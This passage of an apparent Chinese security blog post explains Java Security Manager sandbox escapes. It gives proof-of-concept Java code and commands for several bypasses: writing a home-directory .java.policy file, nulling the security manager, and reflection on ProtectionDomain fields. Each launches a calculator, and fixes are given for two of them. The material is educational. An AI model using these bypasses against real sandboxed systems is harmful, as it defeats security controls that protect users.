System.getSecurityManager(); </span><br><span class="line"><span class="keyword">if</span>(sm != <span class="keyword">null</span>)&#123; System.setSecurityManager(<span class="keyword">null</span>); &#125;</span><br></pre></td></tr></table></figure><p>注意：上面的代码只有在位于<code>${JDK_HOME}/jre/lib/security</code>目录下或者其他指定目录下的java.policy文件中指定了一个权限才会奏效。 这个权限是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;</span><br></pre></td></tr></table></figure><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>FileUtil.java，工具类用于创建文件夹：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.AccessControlException;</span><br><span class="line"><span class="keyword">import</span> java.security.AccessController;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivilegedAction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FOLDER_PATH = <span class="string">"C:\\test"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FileUtil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">makeFile</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File fs = <span class="keyword">new</span> File(<span class="string">"C:\\test\\"</span> + fileName);</span><br><span class="line">            fs.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | AccessControlException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doPrivilegedAction</span><span class="params">(<span class="keyword">final</span> String fileName)</span> </span>&#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;String&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                FileUtil.makeFile(fileName);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DemoDoPrivilege.java，尝试通过三种方式在指定文件夹下创建新文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.AccessControlException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoDoPrivilege</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoDoPrivilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"***************************************"</span>);</span><br><span class="line">        System.out.println(<span class="string">"I will show AccessControl functionality..."</span>);</span><br><span class="line">        System.out.println(<span class="string">"Preparation step : turn on system permission check..."</span>);</span><br><span class="line">        System.out.println(<span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Create a new file named temp1.txt via privileged action ..."</span>);</span><br><span class="line">        FileUtil.doPrivilegedAction(<span class="string">"temp1.txt"</span>);</span><br><span class="line">        System.out.println(<span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">"/////////////////////////////////////////"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Create a new file named temp2.txt via File ..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File fs = <span class="keyword">new</span> File(<span class="string">"C:\\test\\temp2.txt"</span>);</span><br><span class="line">            fs.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AccessControlException | IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"/////////////////////////////////////////"</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------"</span>);</span><br><span class="line">        System.out.println(<span class="string">"create a new file named temp3.txt via FileUtil ..."</span>);</span><br><span class="line">        FileUtil.makeFile(<span class="string">"temp3.txt"</span>);</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------"</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">"***************************************"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>my.policy，自定义的权限配置文件，本地放在和前面文件同一目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.io.FilePermission &quot;C:\\test\\*&quot;, &quot;write&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">grant&#123;</span><br><span class="line">    permission java.security.AllPermission &quot;C:\\test\\*&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>启动安全管理器运行该类，由于权限问题会报java.security.AccessControlException的错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager DemoDoPrivilege</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/5.png" alt=""></p><p>配置权限参数<code>-Djava.security.policy=my.policy</code>，再次启动则创建成功：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/6.png" alt=""></p><h2 id="0x03-Java沙箱逃逸"><a href="#0x03-Java沙箱逃逸" class="headerlink" title="0x03 Java沙箱逃逸"></a>0x03 Java沙箱逃逸</h2><p>由前面Java沙箱的基础组成部分知道，除了Java安全管理器外，其他的基本都是内置实现在JVM和Java语言中的，也就是说，只有Java安全管理器可以被外部用户控制来设置策略文件等。因此，Java沙箱逃逸，实际就是针对Java Security Manager的绕过。</p><h3 id="利用单等号-home目录可写绕过"><a href="#利用单等号-home目录可写绕过" class="headerlink" title="利用单等号+home目录可写绕过"></a>利用单等号+home目录可写绕过</h3><h4 id="Bypass利用"><a href="#Bypass利用" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>jre/lib/security/java.security是Java中指定安全配置文件，在前面的java.security小节中看到，其中指定了两个默认的policy文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># The default is to have a single system-wide policy file,</span><br><span class="line"># and a policy file in the user&apos;s home directory.</span><br><span class="line">policy.url.1=file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">policy.url.2=file:$&#123;user.home&#125;/.java.policy</span><br></pre></td></tr></table></figure><p>而通过<code>-Djava.security.policy</code>指定policy文件时，如果参数后面是一个等号，例如<code>-Djava.security.policy=my.policy</code>，m.policy会加在上面的两个默认的policy文件之后。在默认情况下，home目录下没有.java.policy这个文件。因此，如果home目录可写，则恶意代码可以通过写.java.policy文件，授予自己更多的权限来绕过Java Security Manager。</p><p>假设开发者自定义的策略文件my.policy，虽然没有赋予文件的执行权限，但允许home目录可写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.io.FilePermission &quot;C:\\Users\\Administrator\\*&quot;, &quot;write&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>BypassSandbox类，利用my.policy策略文件允许在home目录可写的设置，将该目录上写入.java.policy文件，其中的策略内容未授权所有文件具有可执行权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String homePolicyFile = <span class="string">"grant &#123;\n    permission java.io.FilePermission \"&lt;&lt;ALL FILES&gt;&gt;\", \"execute\";\n&#125;;"</span>;</span><br><span class="line">        FileWriter writer = <span class="keyword">new</span> FileWriter(<span class="string">"C:\\Users\\Administrator\\.java.policy"</span>);</span><br><span class="line">        writer.write(homePolicyFile);</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit类，恶意类，执行calc命令弹计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行Exploit类是不能成功执行的，被Java安全管理器限制了；然后执行BypassSandbox类往home目录上写.java.policy这个默认策略文件，其中内容为允许所有文件具有可执行权限；最后再次运行Exploit类就能成功弹计算器了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; Exploit</span><br><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; BypassSandbox</span><br><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; Exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/7.png" alt=""></p><h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><p><code>-Djava.security.policy==java.policy</code>，用双等于号指定policy文件。</p><h3 id="利用setSecurityManager绕过"><a href="#利用setSecurityManager绕过" class="headerlink" title="利用setSecurityManager绕过"></a>利用setSecurityManager绕过</h3><h4 id="Bypass利用-1"><a href="#Bypass利用-1" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>Java Security Manager不仅能通过参数<code>-Djava.security.policy==java.policy</code>指定，还可以在运行时通过<code>System.setSecurityManager()</code>方法指定。如果被授予setSecurityManager权限，恶意代码可以在运行时调用setSecurityManager()方法，将Java Security Manager置为null即使安全管理器失效，从而实现绕过。</p><p>假设开发者自定义的策略文件my.policy，设置了setSecurityManager权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>BypassSandbox类，关键在于<code>System.setSecurityManager(null)</code>使得安全管理器失效来实现绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setSecurityManager(<span class="keyword">null</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可绕过安全管理器的限制执行命令弹计算器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; BypassSandbox</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/8.png" alt=""></p><h4 id="修复方法-1"><a href="#修复方法-1" class="headerlink" title="修复方法"></a>修复方法</h4><p>不授予不可信的代码setSecurityManager权限。</p><h3 id="利用反射绕过"><a href="#利用反射绕过" class="headerlink" title="利用反射绕过"></a>利用反射绕过</h3><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>这里我们调试分析下上面的<code>System.setSecurityManager()</code>这个方法，如下图，该方法实际是调用的setSecurityManager0()方法，其中直接把参数直接赋予了System类中的security变量：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/10.png" alt=""></p><p>看到System类中，它的security属性时用private修饰的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The security manager for the system.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> SecurityManager security = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>也就是说，通过反射调用获取该field时是调用getDeclaredField()函数而不是getField()函数。</p><p>如果被赋予了反射权限，那么是否能通过反射直接把System类中的security变量值置为null，使Java Security manager失效呢？</p><p>我们先来尝试一下直接通过反射设置该security为null看看是否成功。</p><p>假设开发者自定义的策略文件my.policy，授予accessDeclaredMembers权限和suppressAccessChecks权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.reflect.ReflectPermission &quot;suppressAccessChecks&quot;;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;accessDeclaredMembers&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>BypassSandbox类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running setSecurityByReflection()"</span>);</span><br><span class="line">        setSecurityByReflection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setSecurityByReflection</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class clz = Class.forName(<span class="string">"java.lang.System"</span>);</span><br><span class="line">        Field field = clz.getDeclaredField(<span class="string">"security"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(System.class, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可是运行报NoSuchFieldException的错误信息，显示说是不存在security这个字段：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/11.png" alt=""></p><p>明明已经用的是getDeclaredField()函数了，为啥还是报不存在该字段的错误呢？</p><p>为此，调试分析getDeclaredField()函数，看看问题在哪。这里看到该函数中调用了privateGetDeclaredFields()函数：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/12.png" alt=""></p><p>跟进去privateGetDeclaredFields()函数，其中调用Reflection类的filterFields()方法对field进行过滤处理：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/13.png" alt=""></p><p>跟进Reflection.filterFields()方法，在filter过滤的黑名单中System类的security字段就在其中被过滤了：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/14.png" alt=""></p><p>看到Reflection类的静态代码中定义了一个fieldFilterMap，即字段过滤Map，这里已经将System类的security字段添加其中了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    HashMap var0 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    var0.put(Reflection.class, <span class="keyword">new</span> String[]&#123;<span class="string">"fieldFilterMap"</span>, <span class="string">"methodFilterMap"</span>&#125;);</span><br><span class="line">    var0.put(System.class, <span class="keyword">new</span> String[]&#123;<span class="string">"security"</span>&#125;);</span><br><span class="line">    var0.put(Class.class, <span class="keyword">new</span> String[]&#123;<span class="string">"classLoader"</span>&#125;);</span><br><span class="line">    fieldFilterMap = var0;</span><br><span class="line">    methodFilterMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，过滤完成之后返回的是System类其他不在黑名单中的字段，当然不包含security：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/15.png" alt=""></p><p>至此就清楚了确实没办法直接通过反射来设置System类的security字段。</p><p>既然负责检查的检察官Java Security Manager不可修改，那就尝试修改检查的材料—ProtectionDomain。</p><p>根据Java的设计，一个类的URL和签名组成了这个类的CodeSource，根据policy文件的配置，一个CodeSource有一定的权限。一个类的CodeSource和它的权限构成了这个类的ProtectionDomain。如图：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/16.png" alt=""></p><p>看到ProtectionDomain类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProtectionDomain</span> </span>&#123;</span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// Set up JavaSecurityAccess in SharedSecrets</span></span><br><span class="line">        SharedSecrets.setJavaSecurityAccess(<span class="keyword">new</span> JavaSecurityAccessImpl());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* CodeSource */</span></span><br><span class="line">    <span class="keyword">private</span> CodeSource codesource ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ClassLoader the protection domain was consed from */</span></span><br><span class="line">    <span class="keyword">private</span> ClassLoader classloader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Principals running-as within this protection domain */</span></span><br><span class="line">    <span class="keyword">private</span> Principal[] principals;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the rights this protection domain is granted */</span></span><br><span class="line">    <span class="keyword">private</span> PermissionCollection permissions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if the permissions object has AllPermission */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> hasAllPerm = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the PermissionCollection is static (pre 1.4 constructor)</span></span><br><span class="line"><span class="comment">       or dynamic (via a policy refresh) */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> staticPermissions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br></pre></td></tr></table></figure><p>如前面所说，一个类的CodeSource和Permissions构成了这个类的ProtectionDomain。这里看到hasAllPerm这个字段，应该是一个标记这个类是否有所有权限的布尔变量。因此可以尝试利用反射将它设置为true来看看是否可以使当前类获取所有权限。但是问题在于AccessController会沿着栈自顶向下检查，必须所有栈帧都有权限才能通过。</p><p>这里我们也遍历所有栈帧，将所有栈帧中的所有类的ProtectionDomain中的hasAllPerm置为true。BypassSandbox类的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running setHasAllPerm()"</span>);</span><br><span class="line">        setHasAllPerm();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHasAllPerm</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();</span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTraceElements) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clz = Class.forName(stackTraceElement.getClassName());</span><br><span class="line">                Field field = clz.getProtectionDomain().getClass().getDeclaredField(<span class="string">"hasAllPerm"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                field.set(clz.getProtectionDomain(), <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可是运行之后还是报错，说是没有getProtectionDomain的权限：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/17.png" alt=""></p><p>这就很尴尬了。我们看下getProtectionDomain()函数的实现，先检查了权限，然后再调用私有的原生方法getProtectionDomain0()来获取ProtectionDomain：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Returns the &#123;<span class="doctag">@code</span> ProtectionDomain&#125; of this class.  If there is a</span></span><br><span class="line"><span class="comment">* security manager installed, this method first calls the security</span></span><br><span class="line"><span class="comment">* manager's &#123;<span class="doctag">@code</span> checkPermission&#125; method with a</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@code</span> RuntimePermission("getProtectionDomain")&#125; permission to</span></span><br><span class="line"><span class="comment">* ensure it's ok to get the</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@code</span> ProtectionDomain&#125;.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the ProtectionDomain of this class</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> SecurityException</span></span><br><span class="line"><span class="comment">*        if a security manager exists and its</span></span><br><span class="line"><span class="comment">*        &#123;<span class="doctag">@code</span> checkPermission&#125; method doesn't allow</span></span><br><span class="line"><span class="comment">*        getting the ProtectionDomain.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> java.security.ProtectionDomain</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> SecurityManager#checkPermission</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> java.lang.RuntimePermission</span></span><br><span class="line"><span class="comment">* <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> java.security.<span class="function">ProtectionDomain <span class="title">getProtectionDomain</span><span class="params">()</span> 